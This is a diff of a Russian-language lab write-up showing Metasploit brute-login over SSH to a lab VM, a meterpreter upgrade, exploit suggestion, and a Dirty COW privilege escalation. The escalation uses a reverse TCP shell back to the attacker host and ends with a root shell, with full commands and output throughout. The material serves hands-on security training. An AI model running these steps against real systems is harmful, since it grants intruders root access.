@@ -23,19 +23,26 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - создаем сессию ssh с vm nodebuntu (192.168.99.102):
 <code>
     msf5 > use auxiliary/scanner/ssh/ssh_login
+
     msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.99.102
+    
     rhosts => 192.168.99.102
     msf5 auxiliary(scanner/ssh/ssh_login) > set username otus
     username => otus
+    
     msf5 auxiliary(scanner/ssh/ssh_login) > set password vic!!vak
+    
     password => vic!!vak
+    
     msf5 auxiliary(scanner/ssh/ssh_login) > run
 
     [+] 192.168.99.102:22 - Success: 'otus:vic!!vak' ''
     [*] Command shell session 1 opened (192.168.99.103:38379 -> 192.168.99.102:22) at 2020-02-26 15:23:30 -0500
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
+    
     msf5 auxiliary(scanner/ssh/ssh_login) > sessions
+
 
     Active sessions
     ===============
@@ -48,6 +55,7 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - апгрейдим сессию в meterpreter
 <code>
     msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
+
     [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
 
     [!] SESSION may not be compatible with this module.
@@ -71,6 +79,7 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - убедимся, что сессия запущена из под пользователя otus
 <code>
     msf5 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
+
     [*] Starting interaction with 2...
 
     meterpreter > shell
@@ -86,9 +95,13 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - смотрим, что нам может посоветовать metasploit suggester в данной ситуации
 <code>
     msf5 auxiliary(scanner/ssh/ssh_login) > use post/multi/recon/local_exploit_suggester 
+
     msf5 post(multi/recon/local_exploit_suggester) > set session 2
+
     session => 2
+
     msf5 post(multi/recon/local_exploit_suggester) > run
+
 
     [*] 192.168.99.102 - Collecting local exploits for x86/linux...
     [*] 192.168.99.102 - 35 exploit checks are being tried...
@@ -105,18 +118,28 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - выбираем этот эксплоит, устанавливаем сессию, в которой запустим эксплоит, payload и параметры подключения
 <code>
     msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/dirtycow_priv_esc
+
     msf5 exploit(linux/local/dirtycow_priv_esc) > set session 2
+
     session => 2
+
     msf5 exploit(linux/local/dirtycow_priv_esc) > set payload linux/x86/meterpreter/reverse_tcp
+
     payload => linux/x86/meterpreter/reverse_tcp
+
     msf5 exploit(linux/local/dirtycow_priv_esc) > set lhost 192.168.99.103
+
     lhost => 192.168.99.103
+
     msf5 exploit(linux/local/dirtycow_priv_esc) > set lport 4321
+
     lport => 4321
 </code>
 
 - запускаем эксплоит
 <code>
+    msf5 exploit(linux/local/dirtycow_priv_esc) > run
+
     [*] Started reverse TCP handler on 192.168.99.103:4321 
     [*] Writing '/tmp/.KvJCwYJAgaw.c' (3077 bytes) ...
     [-] Compiling failed:
@@ -140,6 +163,7 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
     [*] Meterpreter session 3 opened (192.168.99.103:4321 -> 192.168.99.102:60974) at 2020-02-26 15:59:13 -0500
 
     meterpreter > 
+
     [*] Setting '/proc/sys/vm/dirty_writeback_centisecs' to '0'...
 
     Background session 3? [y/N]  
@@ -150,6 +174,7 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
 - убеждаемся в успехе - смотрим открытую сессию 3, запускаем uname -a, id и т.п
 <code>
     msf5 exploit(linux/local/dirtycow_priv_esc) > sessions -i 3
+    
     [*] Starting interaction with 3...
 
     meterpreter > shell
@@ -161,4 +186,5 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
     Linux nodebuntu 4.4.0-42-generic #62-Ubuntu SMP Fri Oct 7 23:11:45 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
     id
     uid=0(root) gid=0(root) groups=0(root),1001(otus)
+    
 </code>
